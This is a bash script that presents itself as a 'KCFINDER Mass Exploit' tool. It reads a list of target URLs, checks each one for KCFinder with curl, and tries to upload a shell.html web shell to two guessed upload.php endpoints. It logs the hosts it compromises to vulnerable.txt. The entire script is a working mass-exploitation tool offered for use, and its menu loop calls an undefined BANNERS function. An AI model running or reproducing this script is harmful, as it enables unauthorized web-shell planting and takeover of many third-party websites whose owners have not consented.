#!/bin/bash
#This colour
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m'
clear
cat << "EOF"
              _                                   
  _ __   __ _| | ____ _ _ __   ___  ___  ___  ___ 
 | '_ \ / _` | |/ / _` | '_ \ / _ \/ __|/ _ \/ __|
 | | | | (_| |   < (_| | | | | (_) \__ \  __/ (__ 
 |_| |_|\__,_|_|\_\__,_|_| |_|\___/|___/\___|\___|
 KCFINDER Mass Exploit - https://nakanosec.com/
		Github.com/Adelittle/		
		
EOF
OPTIONS () {
printf "${lightgreen}[>]${white} LIST TARGET                    : "
read list
kurumi=$(cat $list)
}
OPTIONS
SCAN () {
printf "${lightgreen}############## START SCANNING ##############${white}\n"
for kurumi in $(cat $list);
do
	if [[ $(curl --connect-timeout 3 --max-time 3 -kLs "${kurumi}/" ) =~ '/kcfinder/' ]]; then
		printf "${lightgreen}[+] KCFINDER DETECTED:${white} ${kurumi}\n"
		printf "${lightgreen}    >>>>Running Exploit...${white}\n"
		curl=$(curl -s -L -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${kurumi}" > tmp.txt);
		grep=$(cat tmp.txt | grep "/kcfinder/" | grep "${kurumi}" | grep -Po 'src="\K.*?(?=upload)' | sed -n '1p');
		grepsave2=$(cat tmp.txt | grep "/kcfinder/" | grep -Po 'src="\K.*?(?=upload)' | sed -n '1p' > grep.txt);
		linksave=$(printf "${kurumi}" > list.tmp);
		grep2=$(paste -d "" list.tmp grep.txt);
		end1=$(printf "${grep}upload.php");
		printf "        Try Upload from 1. ${end1}\n"
		url1=$(printf "${end1}" > 1.tmp);
		exurl1=$(cat 1.tmp);
			if [[ $(curl -s -i --connect-timeout 5 -F 'img_avatar=@shell.html' "${exurl1}" && echo "${exurl1}" >> vulnerable.txt) =~ 'HTTP/2 200' ]]; then
			printf "                           ${lightgreen}[+] Shell Uploaded\n"
			else
			printf "${red}                           [-] Failed Upload \n"
			fi
		printf "${white}        Try Upload from 2. ${grep2}upload.php\n"
		url2=$(printf "${grep2}" > 2.tmp);
		exurl2=$(cat 2.tmp);
			if [[ $(curl -s -i --connect-timeout 5 -F 'img_avatar=@shell.html' "${exurl2}/upload.php" && echo "${exurl2}" >> vulnerable.txt) =~ 'HTTP/2 200' ]]; then
			printf "                           ${lightgreen}[+] Shell Uploaded\n"
			else
			printf "${red}                           [-] Failed Upload \n"
			fi
	else
		printf "${red}[-] NOT VULN: ${kurumi}\n"
	fi
done
}
SCAN
RETURNS () {
printf "${lightgreen}############## FINISH SCANNING ##############${white}\n"
printf "${white}WANT TRY OTHER LIST ? (${lightgreen}Y${white}/${red}N${white}) : "
read return_list
if [[ $return_list == "Y" ]]; then
clear
BANNERS
OPTIONS
SCAN
RETURNS
else
printf "THANKS FOR USING THIS TOOLS ! SEE YOU !\n"
printf "DON'T FORGET TO VISIT HTTP://NAKANOSEC.COM\n"
exit
fi
}
RETURNS
